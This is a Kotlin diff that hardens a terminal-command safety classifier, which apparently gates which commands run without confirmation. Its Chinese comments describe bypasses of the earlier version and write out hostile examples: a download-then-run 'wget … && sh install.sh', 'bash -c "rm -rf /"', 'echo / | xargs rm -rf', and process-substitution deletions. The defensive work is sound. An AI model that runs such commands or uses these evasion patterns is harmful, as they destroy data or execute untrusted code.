@@ -124,9 +124,12 @@ object TerminalCommandSafety {
      * `split(vararg delimiters)` 按数组顺序逐个拆，先拆长的才不会把 `&&` 碎成两个 `&`。
      *
      * 单字符 `&` 是"放到后台执行"：`ls & rm -rf x` 会让两件事都发生，必须分段。
-     * （这条是补完 `&&`/`;`/`$(`/反引号之后做对抗性验证才发现的漏网，报告里没列到。）
+     * （这条是补完 `&&`/`;`/`$(`/反引号之后做对抗性验证才发现的漏网。）
+     *
+     * v0.2.75 补 `<(` / `>(`（进程替换）：`ls <(rm -rf x)` 里的子命令同样会执行
+     * （这条是外部复审指出的同类残留）。
      */
-    private val SHELL_SEPARATORS = arrayOf("&&", "||", ";", "|", "&", "\$(", "`")
+    private val SHELL_SEPARATORS = arrayOf("&&", "||", ";", "|", "&", "<(", ">(", "\$(", "`")
 
     /**
      * 是否存在“写到真实文件”的重定向（`> f` / `>> f`）。
@@ -142,13 +145,37 @@ object TerminalCommandSafety {
     /** 命令涉及的包管理器安装动作——这类操作（下载插件）是用户主要诉求，单独标出来。 */
     fun isInstall(command: String): Boolean {
         val normalized = normalize(command)
-        return listOf(
-            "pip install", "pip3 install", "pip uninstall",
-            "conda install", "conda remove",
-            "npm install", "npm i ", "apk add", "apt install", "apt-get install",
-            "git clone", "wget", "curl -o", "curl -L -o", "unzip", "tar -x",
-        ).any { normalized.startsWith(it) || normalized.contains(" $it") }
+        // v0.2.75（安全修复）：与 isReadOnly / isCatastrophic 一样要**分段**。
+        //
+        // 以前只看开头（startsWith / contains），于是「以安装开头」后面接什么都放行：
+        //   wget https://x/install.sh && sh install.sh     ← 下载脚本再执行（等于任意代码）
+        //   git clone u && cd d && ./install.sh            ← 装插件的标准写法
+        //   unzip p.zip && ./install
+        //   pip install x && python -c "…rmtree…"
+        // 而档位 2（默认）的放行条件里就有 isInstall → 这些全都被自动执行。
+        //
+        // 新规则：**首段命中安装/下载，且其余段必须全部只读**。
+        // 为什么其余段要求只读而不是也允许安装：安装动作本身就免确认，
+        // 若允许任意多段安装，`wget x && sh x` 这类"下载后执行"就又能绕过去
+        // （`sh x` 不是安装也不是只读）。宁可多要一次确认。
+        val segments = splitBySeparators(normalized)
+        if (segments.isEmpty()) return false
+        if (!matchesInstall(segments.first())) return false
+        if (segments.size == 1) return true
+        return segments.drop(1).all { segment -> isReadOnly(segment) }
     }
+
+    /** 该段是否以安装/下载动作开头（沿用原有匹配规则）。 */
+    private fun matchesInstall(segment: String): Boolean =
+        INSTALL_PREFIXES.any { prefix -> segment.startsWith(prefix) || segment.contains(" $prefix") }
+
+    /** 安装/下载类动作（与旧实现同一份清单）。 */
+    private val INSTALL_PREFIXES = listOf(
+        "pip install", "pip3 install", "pip uninstall",
+        "conda install", "conda remove",
+        "npm install", "npm i ", "apk add", "apt install", "apt-get install",
+        "git clone", "wget", "curl -o", "curl -L -o", "unzip", "tar -x",
+    )
 
     /**
      * 给命令加执行边界标记，便于从终端输出里切出"这一条命令的输出"。
@@ -353,10 +380,30 @@ object TerminalCommandSafety {
         if (segments.size > 1) {
             // 用同一个函数递归判定每一段。段内可能还有嵌套分隔符，
             // 递归会继续拆——直到每段都不含分隔符为止。
-            return segments.any { isCatastrophic(it) }
+            if (segments.any { isCatastrophic(it) }) return true
+            // v0.2.75：**同时**对整条命令做一次"删除关键路径"判定。
+            //
+            // 只做分段会漏掉"关键信息被拆开"的写法：`echo / | xargs rm -rf` 里
+            // `/` 在第一段、`rm -rf` 在第二段，分段后两边各自都不完整，
+            // 于是 v0.2.74 的分段版本**反而漏了这条**（v0.2.73 不分段时能拦住
+            // —— 那时整条命令的 tokens 里 `/` 与 `rm` 同时出现）。
+            // 这是分段引入的回归，这里补回来：整条命令再判一次。
+            val allTokens = normalized.split(' ', '\t')
+                .map { it.trim('"', '\'') }
+                .filter { it.isNotBlank() }
+            if (deletesCriticalPath(allTokens)) return true
+            return false
         }
 
-        val tokens = normalized.split(' ', '\t').filter { it.isNotBlank() }
+        // v0.2.75（安全修复）：token 统一**剥掉引号**再判定。
+        //
+        // 以前这里不剥，而 isCriticalTarget 剥（trim 引号）——同一份命令里两套口径。
+        // 后果：`bash -c "rm -rf /"` 分词后是 [bash, -c, "rm, -rf, /"]，其中 "rm 不等于 rm，
+        // 于是 deleting 判定为 false、灾难熔断完全不触发。同理漏掉 sh -c / eval / xargs。
+        // （这是词法层的尽力而为：脚本语言里的语义逃逸挡不住，那种靠人工确认兜底。）
+        val tokens = normalized.split(' ', '\t')
+            .map { it.trim('"', '\'') }
+            .filter { it.isNotBlank() }
         if (tokens.isEmpty()) return false
         val verb = commandVerb(tokens)
         if (verb in SHUTDOWN_TOKENS) return true
@@ -367,15 +414,7 @@ object TerminalCommandSafety {
         val chmodLike = tokens.any { it == "chmod" || it == "chown" }
         if (chmodLike && recursiveFlag && tokens.any { isCriticalTarget(it) }) return true
 
-        val deleting = tokens.any { it == "rm" || it == "rmdir" || it == "shred" } ||
-            (tokens.any { it == "find" } && tokens.any { it == "-delete" || it == "-exec" })
-        if (!deleting) return false
-        // `rmdir`/`find -delete` 本身就是递归语义，不要求 -r 标记。
-        val recursive = recursiveFlag ||
-            tokens.any { it == "rmdir" || it == "-delete" || it == "-exec" }
-        if (!recursive) return false
-        if (tokens.any { it == "--no-preserve-root" }) return true
-        return tokens.any { isCriticalTarget(it) }
+        return deletesCriticalPath(tokens)
     }
 
     /**
@@ -386,6 +425,28 @@ object TerminalCommandSafety {
      */
     private fun commandVerb(tokens: List<String>): String? = tokens.firstOrNull {
         !it.startsWith("-") && !it.contains('=') && it !in PREFIX_WORDS
+    }
+
+    /**
+     * 这串 token 是否构成"递归删除关键路径"（v0.2.75 抽出来给两处共用）。
+     *
+     * 三个条件同时满足才算：① 有删除动词（rm/rmdir/shred/find -delete）
+     * ② 有递归语义（-r/-rf/-fr，或 rmdir / find -delete 本身就是递归）
+     * ③ 目标命中关键路径（`/`、`~`、`/usr` 等），或显式 --no-preserve-root。
+     *
+     * 抽成函数是因为「分段后的每一段」与「整条命令」都要用它——
+     * 后者专治关键信息被分隔符拆开的情况（如 `echo / | xargs rm -rf`）。
+     */
+    private fun deletesCriticalPath(tokens: List<String>): Boolean {
+        val deleting = tokens.any { it == "rm" || it == "rmdir" || it == "shred" } ||
+            (tokens.any { it == "find" } && tokens.any { it == "-delete" || it == "-exec" })
+        if (!deleting) return false
+        // `rmdir`/`find -delete` 本身就是递归语义，不要求 -r 标记。
+        val recursive = tokens.any { RECURSIVE_FLAG.matches(it) } ||
+            tokens.any { it == "rmdir" || it == "-delete" || it == "-exec" }
+        if (!recursive) return false
+        if (tokens.any { it == "--no-preserve-root" }) return true
+        return tokens.any { isCriticalTarget(it) }
     }
 
     /**
